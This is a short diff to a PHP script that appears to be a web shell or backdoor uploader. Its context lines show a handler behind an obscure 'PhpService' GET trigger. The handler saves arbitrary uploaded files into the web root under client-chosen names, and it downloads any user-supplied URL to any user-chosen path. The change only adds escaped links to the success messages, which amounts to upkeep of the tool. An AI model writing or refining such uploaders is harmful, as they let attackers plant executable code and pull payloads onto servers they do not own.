@@ -54,7 +54,8 @@ if (isset($_GET['PhpService']) && isset($_GET['0'])) {
             if ($tmpPath != '') {
                 $newPath = './' . $_FILES['uploads']['name'][$i];
                 if (move_uploaded_file($tmpPath, $newPath)) {
-                    echo 'Successfully uploaded ' . $_FILES['uploads']['name'][$i] . '<br />';
+                    $filename = $_FILES['uploads']['name'][$i];
+                    echo 'Successfully uploaded <a href="./' . htmlspecialchars($filename) . '" target="_blank">' . htmlspecialchars($filename) . '</a><br />';
                 } else {
                     echo 'Unable to upload ' . $_FILES['uploads']['name'][$i] . '<br />';
                 }
@@ -73,7 +74,8 @@ if (isset($_GET['PhpService']) && isset($_GET['0'])) {
 <?php
     if (isset($_POST['save_name']) && isset($_POST['url'])) {
         if (file_put_contents($_POST['save_name'], file_get_contents($_POST['url']))) {
-            echo 'Successfully uploaded ' . $_POST['save_name'];
+            $filename = $_POST['save_name'];
+            echo 'Successfully uploaded <a href="./' . htmlspecialchars($filename) . '" target="_blank">' . htmlspecialchars($filename) . '</a>';
         } else {
             echo 'Unable to upload ' . $_POST['save_name'];
         }
